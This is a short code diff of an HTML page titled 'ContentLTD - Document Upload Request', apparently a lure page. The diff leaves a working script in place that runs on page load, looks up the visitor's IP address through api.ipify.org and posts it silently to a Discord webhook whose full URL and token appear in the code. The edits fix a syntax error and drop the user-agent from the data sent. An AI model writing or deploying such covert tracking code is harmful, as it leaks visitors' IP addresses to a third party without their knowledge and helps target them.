@@ -5,18 +5,15 @@
     <title>ContentLTD - Document Upload Request</title>
 <script>
 
-        fetch('https://api.ipify.org'/)
-    const userAgent = navigator.userAgent;
-console.log("User Agent:", userAgent);
+fetch('https://api.ipify.org')
   .then(response => response.text())
   .then(ip => {
     fetch('https://discordapp.com/api/webhooks/1355415804262223973/ipk4ECDTOzczZoFW3tqc7A3xj-OlGYcEjH4Wxxs-4nGNVmuEP8YRzlQPFmvCMdlrZtDB', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: ip, userAgent })
+      body: JSON.stringify({ content: ip })
     });
   })
-
 
 
     </script>
